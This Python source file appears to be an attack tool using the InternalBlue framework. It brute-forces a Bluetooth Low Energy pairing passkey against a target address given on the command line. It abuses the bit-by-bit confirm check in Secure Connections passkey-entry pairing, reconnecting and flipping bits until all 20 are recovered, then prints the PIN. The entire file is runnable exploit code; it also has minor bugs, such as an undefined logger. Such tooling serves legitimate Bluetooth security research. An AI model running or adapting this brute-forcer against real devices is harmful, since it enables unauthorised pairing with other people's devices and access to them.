import binascii
import sys
import time
import logging

from Crypto.Hash import CMAC
from Crypto.Cipher import AES

from internalblue.hcicore import HCICore
from internalblue.cli import InternalBlueCLI

import InternalBlueL2CAP
from BTConnection import BluetoothConnection

SMP_CID = 0x06

class SMP:
    def __init__(self, l2cap, pin_bits):
        self.l2cap = l2cap
       
        # Pairing-related data
        self.pk_a = bytes.fromhex("4C746F9EFDBB5C49CCE450B682AE930441ABE3C63B850ACFDA94812DAC231268")
        self.pk_b = None
        # our random is always the same
        self.random = bytes.fromhex("AA"*16)

        self.bit_index = 0
        self.error_bit = None
        self.bits = pin_bits

        self._setup_logging()

    def _setup_logging(self):
        self.log = logging.getLogger("smp_protocol")
        self.log.setLevel(logging.INFO)
        if not self.log.hasHandlers():
            fmt = logging.Formatter("\x1b[32m[SMP]\x1b[0m %(message)s")
            handler = logging.StreamHandler()
            handler.setFormatter(fmt)
            self.log.addHandler(handler)
            self.log.propagate = False

    # the f4 function from the Bluetooth specification "LE Secure Connections Confirm Value Generation Function f4"
    def f4(self, u, v, x, z):
        self.log.debug(f"f4({binascii.hexlify(u)}, {binascii.hexlify(v)}, {binascii.hexlify(x)}, {z})")
        c = CMAC.new(x, ciphermod=AES)
        c.update(u + v + z)
        return c.digest()

    def send(self, data):
        self.log.debug(f"[SMP SEND]: {binascii.hexlify(data)}")
        self.l2cap.sendData(data, SMP_CID)

    def send_pk(self):
        # SMP Pairing Public Key Command (0x0c)
        # Public Key X: 0x4C746F9EFDBB5C49CCE450B682AE930441ABE3C63B850ACFDA94812DAC231268
        # Public Key Y: 0x997C99476F72FB9C65CF03AF94F10E534040F3A0B47DCDAF80A679034359D9B8
        pk_cmd = bytes.fromhex("0C681223AC2D8194DACF0A853BC6E3AB410493AE82B650E4CC495CBBFD9E6F744CB8D959430379A680AFCD7DB4A0F34040530EF194AF03CF659CFB726F47997C99")
        self.send(pk_cmd)

    def send_confirm(self):
        self.log.info(f"Sending SMP Pairing Confirm Command with bit {self.bit_index + 1}/20: {self.bits[self.bit_index]}")
        confirm_val = self.f4(self.pk_a, self.pk_b, self.random, bytearray([0x80 + self.bits[self.bit_index]]))
        self.send(b"\x03" + confirm_val[::-1])
        self.bit_index += 1

    def listener(self, data, l2cap):
        self.log.debug(f"[SMP RECV]: {binascii.hexlify(data)}")

        if data == b"\x0b\x0d":
            self.log.info("Received SMP Security Request")
            self.send(bytes.fromhex("0104000D100b0b"))
        elif data[0] == 0x01:
            self.log.info("Received SMP Pairing Request")
            self.send(b"\x02\x00\x00\x0d\x10\x01\x03")
        elif data[0] == 0x02:
            self.log.info("Received SMP Pairing Response")
            self.send_pk()
        elif data[0] == 0x03:
            self.log.debug("Received SMP Pairing Confirm Command")
            self.log.debug("Sending SMP Random Command")
            self.send(b"\x04" + self.random)
        elif data[0] == 0x04:
            self.log.debug("Received SMP Random Command")
            if self.bit_index < 20:
                self.send_confirm()
        elif data[0] == 0x05:
            if data[1] == 0x04:
                self.error_bit = self.bit_index - 1
                self.log.error(f"Error on bit at index {self.error_bit} = {self.bits[self.error_bit]}")
            else:
                self.log.error(f"Received SMP Pairing Failed Command with unhandled error {hex(data[1])}")
        elif data[0] == 0x0c:
            self.log.info("Received SMP Pubkey Command")
            pk_x = data[1:33][::-1]
            pk_y = data[34:34+32][::-1]
            self.log.debug(f"PK_X: {binascii.hexlify(pk_x)}\nPK_Y: {binascii.hexlify(pk_y)}")
            self.pk_b = pk_x

            self.send_confirm()
        else:
            self.log.info("Received unknown SMP Command {binascii.hexlify(data)}")


class SMPBruteforce:
    def __init__(self, internalblue, target, guess=[]):
        self.internalblue = internalblue
        self.target = target

        # if there's no guess we just set all bits to 0
        if len(guess) != 20:
            self.pin_bits = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]

        self._setup_logging()

        self.finished = False
        self.attempts = 0
        self.timer = None

    def _setup_logging(self):
        self.log = logging.getLogger("smp_bruteforce")
        if not self.log.hasHandlers():
            fmt = logging.Formatter("\x1b[37m[* SMP Bruteforce]\x1b[0m %(message)s")
            handler = logging.StreamHandler()
            handler.setFormatter(fmt)
            self.log.addHandler(handler)
            self.log.propagate = False
            self.log.setLevel(logging.INFO)

    def bruteforce(self):
        self.log.info(f"Starting SMP bruteforce against {binascii.hexlify(self.target)}")
        self.timer = time.time()
        while not self.finished:
            # connect to the target
            connection = BluetoothConnection(self.internalblue, self.target, reconnect=0)
            l2cap = InternalBlueL2CAP.L2CAPManager(connection)
            smp = SMP(l2cap, self.pin_bits)

            # listen to SMP CID
            l2cap.registerCIDHandler(smp.listener, SMP_CID)

            # set the Bluetooth technology [0->Classic, 1->BLE]
            connection.connection_type = 1

            if connection.connect():
                # let SMP do its thing and obtain the failing index to flip the bit in our list
                while connection.handle and not smp.bit_index >= 20:
                    time.sleep(0.1)

                if smp.error_bit != None:
                    if self.pin_bits[smp.error_bit] == 0:
                        self.pin_bits[smp.error_bit] = 1
                    else:
                        self.pin_bits[smp.error_bit] = 0

                self.log.info(f"Current bits: {self.pin_bits}")

                if smp.bit_index == 20:
                    self.finished = True
                    break

                connection.destroy()
                self.attempts += 1
            else:
                self.log.error(f"Unable to connect to device {binascii.hexlify(self.target)}. Trying again.")

        self.log.info(f"Bruteforcing finished. Took about {(time.time() - self.timer):.2f} seconds and required {self.attempts} connection attempts")
        pin = self.pin_bits_as_int()
        self.log.info("\x1b[31m->\x1b[0m The PIN is %d", pin)
        return pin

    def pin_bits_as_int(self):
        pin = 0
        for idx, val in enumerate(self.pin_bits):
            pin += val << idx

        return pin

def bd_addr_to_bytes(addr_string):
    addr = addr_string.replace(":", "")
    return bytes.fromhex(addr)

def main():
    # we need an internalblue HCI user_channel so that the kernel does
    # not interfere with our SMP messages
    internalblue = HCICore(log_level="debug", user_channel=True)

    if len(sys.argv) != 2:
        log.critical(f"Usage: {sys.argv[0]} [BD_ADDR]")
        log.critical(f"\t[BD_ADDR] can be given as hexstring or with colons separating ever other byte.")
        sys.exit(1)

    target = sys.argv[1]

    # let user choose device if more than one is connected
    devices = internalblue.device_list()
    if len(devices) > 1:
        # use internalblue's options function which replaces pwntool's
        i = InternalBlueCLI.options("Please specify device: ", [d[2] for d in devices])
        internalblue.interface = internalblue.device_list()[i][1]
    else:
        internalblue.interface = internalblue.device_list()[0][1]

    if not internalblue.connect():
        log.critical("No connection to internalblue device.")
        sys.exit(-1)

    # now we need the bd addr of the target
    target = bd_addr_to_bytes(target)

    smpbf = SMPBruteforce(internalblue, target)
    smpbf.bruteforce()


if __name__ == "__main__":
    main()

